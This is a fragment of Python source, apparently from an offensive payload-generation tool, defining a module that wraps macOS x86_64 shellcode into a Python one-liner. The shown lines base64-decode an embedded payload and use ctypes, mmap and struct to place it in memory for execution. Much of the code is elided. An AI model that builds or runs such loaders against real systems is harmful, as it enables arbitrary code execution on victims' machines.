...
class Python(Module):
    """
    Format OSX x86_64 shellcode into python code, for use with 64-bit cpython.
    """
    ...
    def do(self, data:bytes=None, options:dict=None) -> bytes:
        ...
        cmd = ("import sys,base64,ctypes,mmap,struct;"+
            ...
            # If 64-bit python, decode payload
            "c=base64.b64decode('%(encoded)s') if p==8 else sys.exit(1);"+
            ...
            "a=struct.unpack('<Q',ctypes.string_at(id(m)+2*p,p))[0];"+
